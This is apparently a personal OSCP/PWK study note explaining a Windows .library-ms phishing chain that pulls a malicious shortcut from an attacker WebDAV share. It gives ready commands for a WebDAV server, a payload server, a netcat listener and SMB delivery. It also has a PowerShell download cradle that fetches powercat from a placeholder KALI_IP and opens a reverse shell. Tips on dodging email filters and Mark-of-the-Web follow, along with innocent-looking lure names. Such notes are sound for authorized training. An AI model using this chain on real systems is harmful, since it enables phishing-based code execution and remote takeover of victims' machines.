---
title: "Windows Library Files — WebDAV Attack Chain"
created: "2026-04-05"
type: permanent-note
status: active
tags:
  - permanent-note
  - windows-library
  - webdav
  - client-side
  - oscp
---

# Windows Library Files — WebDAV Attack Chain

**Core idea:** Windows `.library-ms` files are XML configs that tell Explorer to display a virtual folder — including content from network WebDAV shares. An attacker hosts a malicious shortcut on a WebDAV share, sends the library file to a victim, and gets code execution when they click the shortcut — **no macros, no executables, just XML and a link file**.

---

## Why This Is Clever

Most client-side attacks hit one of three walls:
1. **Email AV blocks** executable attachments
2. **MotW blocks** macro execution in downloaded Office files
3. **User suspicion** when a file looks dangerous

A `.library-ms` file is just XML. Email gateways don't flag it. It looks like a Windows configuration file — not a weapon. When the victim opens it, Windows Explorer silently connects to a WebDAV share and displays its contents as a normal folder. The actual payload (the shortcut) is fetched live from your server — not attached to the email at all.

---

## The Three-Component Chain

```
[1] config.Library-ms     →  XML file pointing to attacker WebDAV IP
        ↓ (victim opens)
[2] WebDAV share          →  hosts automatic_configuration.lnk
        ↓ (victim sees in Explorer, clicks)
[3] shortcut payload      →  PowerShell download cradle → Powercat → reverse shell
```

Each component looks innocent in isolation:
- Library file = Windows feature file
- WebDAV share = standard file server
- Shortcut = common Windows link

---

## The MotW Angle

Why not just use a macro-enabled Word document?

Since 2022, MotW-tagged documents block macros. The ISO bypass works but requires the victim to mount the ISO first — an extra step that raises suspicion.

The Library file attack has **no MotW concern** because:
- The `.library-ms` file doesn't execute code itself
- The `.lnk` shortcut is served live from a WebDAV share — it's never "downloaded from the internet" from Windows' perspective
- PowerShell is a legitimate signed binary — not blocked by default

---

## Setup in 4 Commands

```bash
# 1. Install and start WebDAV
pipx install wsgidav
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav/

# 2. Serve powercat
cd /usr/share/powershell-empire/empire/server/data/module_source/management/
python3 -m http.server 8000

# 3. Start listener
nc -nvlp 4444

# 4. Deliver library file (email or SMB upload)
smbclient //TARGET_IP/share -c 'put config.Library-ms'
```

---

## What to Put in the Shortcut

The shortcut's "location" field runs this as a command:
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8000/powercat.ps1'); powercat -c KALI_IP -p 4444 -e powershell"
```

Name it something that looks like legitimate IT tooling: `automatic_configuration`, `VPN_Setup`, `IT_Support_Tool`.

---

## Connections

- [[PWK-Module-12-Client-Side-Attacks]] — full module with all commands and XML template
- [[PWK-Module-11-Phishing-Basics]] — how to deliver the library file convincingly
- The WebDAV server pattern (WsgiDAV) reappears in other attacks — hosting payloads, SMB relay
- Powercat reverse shell is the same payload used in Command Injection (Module 09)

---

*From: PWK Module 12*
